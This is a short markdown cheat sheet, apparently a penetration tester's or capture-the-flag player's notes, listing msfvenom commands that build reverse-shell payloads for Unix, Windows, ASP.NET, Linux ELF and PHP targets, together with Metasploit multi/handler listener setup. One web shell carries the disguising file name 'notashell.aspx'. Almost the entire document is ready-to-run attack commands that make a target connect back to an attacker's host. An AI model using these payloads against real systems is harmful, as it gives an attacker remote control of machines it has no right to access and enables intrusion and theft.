# MSF-Venom

```
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

-p = payload
lhost = our local host IP address
lport = the port to listen on
R = export the payload in raw format
```

## Reverse TCP Payload

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f exe > ./reverse_tcp.exe

On the attacker machine (msfconsole)

msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost IP
msf exploit(handler) > set lport PORT
msf exploit(handler) > exploit
```

## ASP.NET shell

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.9.134 lport=53 -f aspx -o notashell.aspx
```

## Elf shell

Good for multi/handler

```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.11.9.134 LPORT=9002 -f elf -o rev
erse.elf
```

## PHP and meterpreter shell

```
msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.4 lport=53 -o meterpreter.php

use exploit/multi/handler
set lhost 10.13.37.4
set payload php/meterpreter_reverse_tcp
set lport 53
run
```
